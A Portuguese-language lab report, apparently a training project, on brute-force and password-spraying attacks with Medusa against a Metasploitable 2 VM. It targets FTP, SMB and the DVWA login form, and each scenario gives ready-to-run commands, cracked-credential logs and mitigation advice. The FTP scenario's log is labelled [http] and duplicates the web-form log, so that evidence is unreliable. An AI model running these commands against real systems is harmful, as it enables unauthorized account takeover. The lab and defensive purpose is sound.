# Força Bruta e Password Spraying

## Sobre o Projeto
Este projeto documenta a exploração de vulnerabilidades de autenticação em um ambiente controlado utilizando **Kali Linux** e a ferramenta **Medusa** (e Hydra). O objetivo é demonstrar a eficácia de ataques de dicionário e password spraying, bem como propor medidas de mitigação.

### Ferramentas Utilizadas
* **Kali Linux** (Atacante)
* **Metasploitable 2** (Alvo - IP: `192.168.56.102`)
* **Medusa** (FTP, SMB e Web Form DVWA)
* **Wordlists:** `user.txt` e `pass.txt` (criadas com opções genéricas para teste)

---

## Cenário 1: FTP Brute Force
**Exploração do serviço FTP (Porta 21).**

### Comando Executado
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 10
```
```text
Log de Saída
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: user [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: password [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: user [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: user [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: password [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: msfadmin [SUCCESS]
2025-11-30 17:55:36 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: user [SUCCESS]
2025-11-30 17:55:36 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: password [SUCCESS]
2025-11-30 17:55:36 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: qwerty [SUCCESS]
```
Evidência Visual:

### Análise e Mitigação

Análise da Vulnerabilidade: O ataque obteve sucesso devido à utilização de credenciais padrão e senhas fracas, além da ausência de mecanismos de defesa contra múltiplas tentativas de login.

Recomendações de Segurança:
1. Política de Senhas Fortes: Implementar a exigência de senhas complexas e forçar a alteração imediata de senhas padrão de fábrica.
2. Account Lockout: Configurar o serviço para bloquear temporariamente o usuário após um número definido de tentativas falhas (ex: 3 ou 5 tentativas), impedindo a continuidade do ataque de força bruta.
3. Implementação de Fail2Ban: Utilizar ferramentas como o Fail2Ban no servidor Linux que monitora os logs de acesso e cria regras no firewall (iptables) para banir automaticamente o IP do atacante que gera muitos erros de autenticação.
4. Substituição do Protocolo: Recomenda-se desativar o serviço FTP e utilizar exclusivamente o SFTP (SSH File Transfer Protocol), que criptografa toda a conexão.


## Cenário 2: SMB Password Spraying
**Ataque direcionado ao protocolo de compartilhamento de arquivos, testando uma senha comum em múltiplos usuários.**

### Comando Executado
```bash
medusa -h 192.168.56.102 -U users.txt -p msfadmin -M smbnt -t 10
```
```text
Log de Saída
2025-11-30 17:35:54 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ Access Allowed)]
```
Evidência Visual:

### Análise e Mitigação

Análise da Vulnerabilidade: O sucesso do ataque de Password Spraying demonstra que as políticas de bloqueio de conta tradicionais podem ser contornadas ao testar poucas senhas contra muitos usuários. Além disso, a permissão de acesso irrestrito às portas SMB (139/445) facilitou a enumeração e a exploração.

Recomendações de Segurança:
1. Segregação de Rede e Firewall: Restringir o acesso às portas SMB (139 e 445) apenas para IPs ou sub-redes autorizadas. Jamais expor o serviço SMB diretamente para a internet ou redes de visitantes/Wi-Fi não confiáveis.
2. Monitoramento e Detecção (SIEM): Implementar monitoramento de logs para detectar o padrão específico do Spraying: múltiplas falhas de login vindas de um único endereço IP visando diversas contas de usuário diferentes em um curto período de tempo.
3. Desativação do SMBv1: Garantir que versões obsoletas e vulneráveis do protocolo (SMBv1) estejam desabilitadas, forçando o uso de SMBv2 ou v3 com criptografia e assinatura de pacotes (SMB Signing) habilitadas.
4. Princípio do Privilégio Mínimo: Garantir que contas de serviço ou administrativas não tenham senhas previsíveis (como o próprio nome do usuário) e auditar regularmente permissões de compartilhamento.


## Cenário 3: Web Form Brute Force (DVWA)
**Ataque a formulário Web. Foi realizada análise prévia com "Inspecionar Elemento" para identificar os parâmetros username, password e Login.**

### Comando Executado
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http -m PAGE:/dvwa/login.php -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
```
```text
Log de Saída
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: user [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: password [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: user [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: user [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: password [SUCCESS]
2025-11-30 17:55:35 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: msfadmin [SUCCESS]
2025-11-30 17:55:36 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: user [SUCCESS]
2025-11-30 17:55:36 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: password [SUCCESS]
2025-11-30 17:55:36 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: qwerty [SUCCESS]
```
Evidência Visual:

### Análise e Mitigação

Análise da Vulnerabilidade: O sucesso na quebra de múltiplas credenciais demonstra a falta de mecanismos de controle essenciais em formulários web. A ausência de limitação de tentativas permite que ferramentas automatizadas executem ataques de força bruta e de dicionário de forma irrestrita.

Recomendações de Segurança (Defesa em Profundidade):
1. Rate Limiting: Implementar uma política no servidor web ou na aplicação para limitar estritamente o número de tentativas de login por IP dentro de um período de tempo curto (ex: 5 tentativas a cada 5 minutos).
2. CAPTCHA e Honeypots: Adicionar um mecanismo de CAPTCHA (como reCAPTCHA) ou um campo Honeypot para diferenciar usuários legítimos de ferramentas automatizadas.
3. Bloqueio de IP: Implementar um mecanismo de bloqueio temporário ou permanente do IP de origem após exceder o limite de tentativas (Rate Limiting).
4. Autenticação Multifator (MFA/2FA): Para contas com privilégios elevados (admin, root), a implementação da Autenticação de Dois Fatores é a defesa mais forte contra a força bruta, pois a senha roubada se torna inútil sem o segundo fator.
